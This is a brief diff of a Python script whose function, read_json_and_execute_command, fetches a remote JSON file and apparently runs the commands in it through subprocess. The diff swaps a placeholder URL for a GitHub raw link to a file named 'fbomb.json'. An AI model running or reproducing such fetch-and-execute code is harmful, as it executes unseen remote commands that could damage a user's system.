@@ -2,7 +2,7 @@ import requests
 import subprocess
 import json
 
-JSON = "http://example.com/file.json"
+JSON = "https://raw.githubusercontent.com/JuanBindez/fbomb/main/fbomb.json"
 
 def read_json_and_execute_command(link):
     response = requests.get(link)
